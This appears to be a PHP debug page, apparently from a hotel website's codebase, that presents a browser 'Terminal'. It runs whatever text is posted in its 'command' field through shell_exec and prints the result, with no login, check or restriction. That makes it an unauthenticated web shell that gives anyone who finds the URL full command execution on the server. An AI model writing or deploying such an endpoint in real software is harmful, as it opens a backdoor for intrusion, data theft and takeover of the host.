<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
  $path = strpos($_SERVER['SERVER_NAME'], "northwoodhotel") ? "export PATH=$PATH:~/git-2.9.5 && " : "";
  echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec($path . $_POST['command']))));
  return;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Terminal</title>
</head>
<body>
  <form id="frmCommand">
    <input type="text" name="command" autofocus>
  </form>
  <br/>
  <div id="message"></div>
  <script src="assets/js/required/1_jquery.min.js"></script>
  <script>
    $('#frmCommand').submit(function(e){
      e.preventDefault();
      $.ajax({
        context: this,
        type: 'POST',
        url: 'debug.php',
        data: $(this).serialize(),
        success: function(response) {
          $('#message').html(response);
          $(this).trigger("reset");
        }
      });
    });
  </script>
</body>
</html>